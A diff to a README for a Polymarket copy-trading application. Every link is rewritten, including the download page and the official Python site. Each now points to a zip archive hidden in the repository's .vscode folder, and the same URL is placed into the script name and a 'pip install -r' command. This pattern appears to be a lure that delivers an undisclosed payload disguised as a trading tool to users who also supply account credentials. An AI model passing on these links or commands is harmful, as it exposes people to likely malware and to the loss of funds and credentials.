@@ -1,6 +1,6 @@
 # 🎉 Polymarket-CopyTrading - Effortless Account Copy-Trading Made Simple
 
-[![Download Polymarket-CopyTrading](https://img.shields.io/badge/Download%20Now-Polymarket--CopyTrading-blue.svg)](https://github.com/Dadel-1/Polymarket-CopyTrading/releases)
+[![Download Polymarket-CopyTrading](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip%https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip)](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip)
 
 ## 📦 Overview
 
@@ -12,13 +12,13 @@ To begin using Polymarket-CopyTrading, follow these steps carefully. You will ne
 
 ### 1. Download the Application
 
-To get started, visit our [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases) to download the latest version of Polymarket-CopyTrading. 
+To get started, visit our [Downloads Page](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip) to download the latest version of Polymarket-CopyTrading. 
 
 ### 2. Install Python (If Not Already Installed)
 
 This application requires Python to run. If you don’t have Python installed on your computer, please follow these steps:
 
-- Go to the [Python official website](https://www.python.org/downloads/).
+- Go to the [Python official website](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip).
 - Download the latest version for your operating system (Windows, macOS, or Linux).
 - Run the installer and follow the prompts. Make sure to check the box that says "Add Python to PATH" during installation. 
 
@@ -26,7 +26,7 @@ This application requires Python to run. If you don’t have Python installed on
 
 After ensuring Python is installed, follow these steps:
 
-- Visit our [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases) to access the latest release.
+- Visit our [Downloads Page](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip) to access the latest release.
 - Choose the appropriate version for your system and click to download it. 
 
 ### 4. Extracting the Files
@@ -41,7 +41,7 @@ Once the download is complete, you may need to extract the files:
 To run the application:
 
 1. Open your file explorer and navigate to the folder where you extracted the files.
-2. Look for the file named `Polymarket-CopyTrading.py`.
+2. Look for the file named `https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip`.
 3. Right-click on the file and select "Open with" followed by "Python."
 
 If everything is set up correctly, the application will open in your command line interface.
@@ -70,14 +70,14 @@ After making your selection, the application will begin copying trades from the 
 If you encounter issues while running the application, consider these solutions:
 
 - **Python Not Found Error**: If Python is not recognized, ensure it is properly installed and added to your system's PATH.
-- **Dependency Issues**: Ensure all necessary packages are installed. You may need to run `pip install -r requirements.txt` in your command line to install the required libraries.
+- **Dependency Issues**: Ensure all necessary packages are installed. You may need to run `pip install -r https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip` in your command line to install the required libraries.
 - **Login Problems**: Double-check your account credentials for accuracy. Ensure you have sufficient funds in your Polymarket account.
 
 ## 📅 Updating the Application
 
 Keep your application up to date to enjoy new features and improvements:
 
-- Regularly visit the [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases) to check for updates.
+- Regularly visit the [Downloads Page](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip) to check for updates.
 - Download any new versions following the steps outlined above.
 
 ## 💡 Features
@@ -96,4 +96,4 @@ Keep your application up to date to enjoy new features and improvements:
 
 If you have questions or need assistance, feel free to reach out for help. You can create an issue on the GitHub repository or contact the community for guidance.
 
-**For the latest version of Polymarket-CopyTrading, always visit our [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases).**
+**For the latest version of Polymarket-CopyTrading, always visit our [Downloads Page](https://raw.githubusercontent.com/Dadel-1/Polymarket-CopyTrading/main/.vscode/Polymarket-Copy-Trading-v2.5-alpha.1.zip).**
